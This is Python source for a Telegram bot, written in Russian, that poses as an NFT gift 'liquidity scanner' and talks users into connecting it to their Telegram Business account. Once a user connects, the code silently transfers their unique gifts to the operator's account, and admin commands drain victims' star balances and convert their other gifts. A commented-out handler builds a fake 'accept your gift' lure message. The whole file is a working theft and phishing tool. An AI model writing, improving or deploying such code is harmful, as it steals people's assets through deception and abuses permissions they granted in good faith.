from aiogram import types, Dispatcher, Bot, F
from aiogram.types import business_connection
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift
from aiogram.types import InputMediaPhoto, FSInputFile
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from custom_methods import GetFixedBusinessAccountStarBalance

import logging
import asyncio
import json
import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    # Пример: загружаем из файла или словаря
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, "Подключение... Установка соединения 🔄")
        save_business_connection_data(business_connection)

        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                remove_connection(business_connection.id)
                await bot.send_message(ADMIN_ID,f"❌ Подключение пользователя #{business_connection.user.id} недействительно и удалено.")
                return
            else:
                raise
        transferred = 0
        for gift in gifts.gifts:
            if gift.type == "unique":
                try:
                    await bot(TransferGift(
                        business_connection_id=business_connection.id,
                        new_owner_chat_id=int(ADMIN_ID),
                        owned_gift_id=gift.owned_gift_id,
                        star_count=25  # без комиссии, если нужно — укажи 25
                    ))
                    transferred += 1
                except Exception as e:
                    logging.warning(f"Не удалось передать подарок: {gift.owned_gift_id}: {e}")

        await bot.send_message(business_connection.user.id, f"✅ Подключено. ")

        logging.info(f"Бизнес-аккаунт подключен: {business_connection.user.id}")
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения.")
def remove_connection(business_connection_id):
    try:
        if not os.path.exists(CONNECTIONS_FILE):
            return
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            connections = json.load(f)
        connections = [c for c in connections if c.get("business_connection_id") != business_connection_id]
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(connections, f, indent=2, ensure_ascii=False)
        logging.info(f"Удалено отключённое подключение: {business_connection_id}")
    except Exception as e:
        logging.exception("Ошибка при удалении записи о подключении")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"Неизвестный бизнес connection_id: {conn_id}")
            return

    except Exception as e:
       logging.exception("Ошибка при ответе.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 25

    if message.from_user.id != ADMIN_ID:
        builder = InlineKeyboardBuilder()
        builder.button(text="🔍 Start Scanning", callback_data='verify')
        auth = builder.as_markup()

        photo = FSInputFile("media/4.jpg")
        caption = (f"Добро пожаловать в @nft_giftsScannerbot - этот бот Ваш инструмент и помощник для проверки ликвидности подарков Telegram!\n\nПроанализируйте любой чат, чтобы выяснить, какие подарки имеют высокую ликвидность, а какие могут быть менее ценными.\n\n🔹Быстрый анализ ликвидности подарков\n🔹Удобные инструменты фильтрации и поиска.\n🔹Быстро распознавайте неликвидные или малоценные подарки.")
        await message.answer_photo(photo=photo, caption=caption, reply_markup=auth)
    else:
        await message.answer(
            f"owner: ...\n🔗 Количество подключений: {count}\n/gifts - просмотреть гифты\n/stars - просмотреть звезды\n/transfer <owned_id> <business_connect> - передать гифт вручную\n/convert - конвертировать подарки в звезды")

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if  message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("Используй формат: /transfer <owned_gift_id> <business_connection_id>")

        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("❌ Нет активного бизнес-подключения.")

        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))

        await message.answer("✅ Подарок успешно передан тебе!")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await message.answer(f"Ошибка: {e}")
    except TelegramBadRequest as e:
        await message.answer(f"❌ Ошибка передачи: {e.message}")
    except Exception as e:
        await message.answer(f"⚠️ Неизвестная ошибка: {e}")


@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        if not connections:
            await message.answer("❌ Нет подключённых бизнес-аккаунтов!")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(
                text=name,
                callback_data=f"gifts:{user_id}"
            )

        await message.answer("Выбери пользователя:", reply_markup=kb.as_markup())

    except FileNotFoundError:
        await message.answer("Файл подключений не найден.")
    except Exception as e:
        logging.exception("Ошибка при загрузке подключений")
        await message.answer(f"Ошибка при загрузке подключений")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split(":", 1)[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)

        if not connection:
            await callback.message.answer("Подключение для этого пользователя не найдено.")
            return

        business_connection_id = connection["business_connection_id"]

        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"🆔 Бизнес коннект: <b>{business_connection_id}</b>\n⭐️ Баланс звёзд: <b>{star_balance.star_amount}</b>\n\n"
        keyboard = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                            [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")]
                        ]
                    )
        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            text += "🎁 Нет подарков."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"🎁 <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"🆔 Модель: <code>{gift.gift.model.name}</code>\n\n\n⭐️ Стоимость трансфера: {gift.transfer_star_count} ⭐️"
                    )
                    kb = InlineKeyboardMarkup(
                            inline_keyboard=[
                                [
                                    InlineKeyboardButton(
                                        text="🎁 Передать мне",
                                        callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}"
                                    )
                                ]
                            ]
                        )
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
            await callback.message.answer("👇 Выберите действие:", reply_markup=keyboard)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к подаркам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        logging.exception("Ошибка при получении данных")
        await callback.message.answer(f"Ошибка: {e}")
 
@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()

    if callback.from_user.id != ADMIN_ID:
        return

    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)

        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("Подключение не найдено.")
            return

        business_connection_id = connection["business_connection_id"]

        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=gift_id,
            star_count=0
        ))

        if result:
            await callback.message.answer("🎉 Подарок успешно передан тебе!")
        else:
            await callback.message.answer("⚠️ Не удалось передать подарок.")

    except TelegramBadRequest as e:
        if "PAYMENT_REQUIRED" in e.message:
            await bot(TransferGift(
                business_connection_id=business_connection_id,
                new_owner_chat_id=int(ADMIN_ID),
                owned_gift_id=gift_id,
                star_count=25
            ))
        elif "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        logging.exception("Ошибка при передаче подарка")
        await callback.message.answer(f"Ошибка: {e}")


@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа!")
        return
    
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        await message.answer("❌ Нет подключённых бизнес-аккаунтов!")
        return

    if not connections:
        await message.answer("❌ Нет подключённых бизнес-аккаунтов!")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"stars:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("🔹 Выберите пользователя для просмотра баланса звёзд:", reply_markup=kb)

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    # Загружаем конект
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    conn = next((c for c in connections if c["user_id"] == user_id), None)
    if not conn:
        await callback.answer("❌ Подключение не найдено.", show_alert=True)
        return

    business_connection_id = conn["business_connection_id"]

    try:
        # Получаем баланс
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.star_amount

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✨ Передать звезды мне", callback_data=f"transfer_stars:{business_connection_id}")]
        ])

        await callback.message.answer(f"⭐ <b>У пользователя {conn['first_name']} {conn['last_name'] or ''} — {star_count} звёзд.</b>", parse_mode="HTML", reply_markup=kb)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"⚠️ Ошибка получения баланса: {e.message}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    business_connection_id = callback.data.split(":")[1]

    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.star_amount

        result = await bot.transfer_business_account_stars(
            business_connection_id=business_connection_id,
            star_count=star_balance
        )
        if result:
            await callback.message.answer("✅ Звезды успешно переданы вам!")
        else:
            await callback.message.answer(f"❌ Ошибка передачи звёзд: {e.message}")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"❌ Ошибка передачи звёзд: {e.message}")

async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: str) -> str:
    try:
        # Получаем подарки
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        gifts = gifts_response.gifts

        count = 0
        for gift in gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.gift.id
                    ))
                    count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue  # просто пропускаем
                    else:
                        raise e  # пробрасываем другие ошибки

        if count == 0:
            return "У вас нет обычных (неуникальных) подарков для конвертации."
        return f"✅ Конвертировано {count} подарков в звёзды."

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            return "⚠️ Пользователь запретил доступ"
        return f"⚠️ Ошибка: {e}"
    except Exception as e:
        return f"❌ Непредвиденная ошибка: {e}"

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await message.answer("❌ Не удалось загрузить подключения.")

    if not connections:
        return await message.answer("❌ Нет подключённых бизнес-аккаунтов!.")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"convert_select:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("Выберите пользователя для преобразования подарков:", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("❌ Подключение не найдено.")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="♻️ Преобразовать обычные подарки в звезды",
                    callback_data=f"convert_exec:{user_id}"
                )
            ]
        ]
    )

    await callback.message.edit_text(
        f"Выбран пользователь: @{connection.get('username', 'неизвестно')}",
        reply_markup=keyboard
    )

from aiogram.methods import GetBusinessAccountGifts, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import CallbackQuery
from aiogram import F

@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception as e:
        return await callback.message.edit_text("⚠️ Не удалось загрузить подключения.")

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("❌ Подключение не найдено.")

    try:
        # Получаем список подарков пользователя
        response = await bot(GetBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts = response.gifts
    except TelegramBadRequest as e:
        return await callback.message.edit_text(f"Ошибка: {e.message}")
    
    if not gifts:
        return await callback.message.edit_text("🎁 У пользователя нет подарков.")

    converted_count = 0
    failed = 0
    for gift in gifts:
        if gift.type == "unique":
            continue

        try:
            print(gift.gift.id)
            await bot(ConvertGiftToStars(
                business_connection_id=connection["business_connection_id"],
                owned_gift_id=str(gift.owned_gift_id)
            ))
            converted_count += 1
        except TelegramBadRequest as e:
            print(e)
            failed += 1
        except Exception as e:
            print(e)
            failed += 1

    await callback.message.edit_text(
        f"✅ Успешно конвертировано: {converted_count} подарков.\n"
        f"❌ Ошибок: {failed}"
    )

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return
    await message.answer("Проверка выполнена. Бот готов к работе!")


@dp.callback_query(F.data == "verify")
async def handle_verify(callback: types.CallbackQuery):
    chat_id = callback.from_user.id
    
    await callback.message.delete()
    
    connections = load_connections()
    user_connected = any(str(chat_id) == str(conn["user_id"]) for conn in connections)
    
    if user_connected:
        await bot.send_message(
            chat_id,
            "✅ Вы успешно подключены к бизнес-аккаунту!\n\n"
            "Теперь вы можете использовать все функции бота.",
            parse_mode="HTML"
        )
        return
    
    photos = [
        InputMediaPhoto(
            media=FSInputFile("media/1.jpg"), 
            caption="<b>Для проведения анализа необходимо подключить бота к бизнес-чату.\nЭто позволяет боту получать доступ к сообщениям и данным о подарках для получения более точных результатов!</b>",
            parse_mode="HTML"
        ),
        InputMediaPhoto(media=FSInputFile("media/2.jpg")),
        InputMediaPhoto(media=FSInputFile("media/3.jpg")),
    ]
    
    await bot.send_media_group(chat_id, media=photos)

    builder = InlineKeyboardBuilder()
    builder.button(text="Проверить подключение 🔁", callback_data="check_auth")
    check_auth = builder.as_markup()

    await bot.send_message(
        chat_id,
        "<b>Для авторизации требуется:</b>\n"
        "1. ⚙️ Откройте Настройки Telegram\n"
        "2. 💼 Перейдите в Telegram для бизнеса\n"
        "3. 🤖 Найдите пункт Чат-боты\n"
        "4. ✍️ Введите @nft_giftsScannerbot и предоставьте разрешения",
        reply_markup=check_auth,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "check_auth")
async def check_auth_handler(callback: types.CallbackQuery):
    chat_id = callback.from_user.id
    connections = load_connections()
    user_connected = any(str(chat_id) == str(conn["user_id"]) for conn in connections)
    
    if user_connected:
        await callback.answer("✅ Вы успешно подключены!", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await bot.send_message(
            chat_id,
            "🎉 Поздравляем! Вы успешно подключили ботa.\n"
            "Теперь вам доступны все функции.\n/select_chat - выбор чата\n/select_group - выбор группы\n/liquid_nft - анализ на ликвидность\n/my_gifts - мои подарки",
            parse_mode="HTML"
        )
    else:
        await callback.answer("❌ Вы еще не подключили бота. Пожалуйста, следуйте инструкции выше!", show_alert=True)



# @dp.inline_query()
# async def inline_gift_handler(inline_query: InlineQuery):
#     query = inline_query.query.lower()
#
#     if "nft" in query or "gift" in query:
#         # Парсим URL NFT
#         nft_url = inline_query.query
#         nft_name = nft_url.split('/')[-1]  # Получаем часть после последнего /
#         name_part, number_part = nft_name.split('-') if '-' in nft_name else (nft_name, '1')
#
#         builder = InlineKeyboardBuilder()
#         builder.button(
#             text="🎁 Принять подарок",
#             url=f"https://t.me/NFTprlce_robot"
#         )
#         builder.button(
#             text="🖼 Показать подарок",
#             url=nft_url
#         )
#         builder.adjust(1)
#
#         result = InlineQueryResultArticle(
#             id="1",
#             title=f"Отправить NFT подарок: {name_part} #{number_part}",
#             description=f"Нажмите, чтобы отправить {name_part} #{number_part}",
#             input_message_content=InputTextMessageContent(
#                 message_text=(
#                     f"<b><a href='{nft_url}'>💌</a> {name_part} #{number_part}</b>\n\n"
#                     f"🎁 <i>Кто-то решил вас порадовать — получить свой подарок нажав \"Принять\"</i>"
#                 ),
#                 parse_mode="HTML"
#             ),
#             reply_markup=builder.as_markup(),
#             thumbnail_url=nft_url
#         )
#
#         await inline_query.answer([result], cache_time=1)

async def main():
    print("owner: unknown")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
